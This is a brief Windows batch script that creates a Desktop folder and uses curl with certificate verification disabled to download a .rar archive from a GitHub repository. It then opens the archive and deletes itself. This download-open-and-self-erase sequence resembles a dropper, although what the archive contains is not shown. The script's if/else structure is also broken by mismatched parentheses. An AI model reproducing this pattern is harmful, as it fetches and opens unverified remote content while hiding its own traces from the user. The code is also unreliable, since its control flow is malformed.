color 5
@echo off
SETLOCAL ENABLEDELAYEDEXPANSION


Mode 105,30



:35219591961070
cls
echo.
echo Downloading files. When the process is finished, click ENTER to go back
echo.
mkdir "%USERPROFILE%\Desktop\instructions_and_the_rest"
if exist "%USERPROFILE%\Desktop\instructions_and_the_rest" (
curl -g -k -L -# -o "%USERPROFILE%\Desktop\instructions_and_the_rest.rar" "https://github.com/checkmate69/rzeczy/raw/main/instructions_and_the_rest.rar"
)

) ELSE (
start ""  "%USERPROFILE%\Desktop\instructions_and_the_rest.rar"
pause>nul
cls
del %0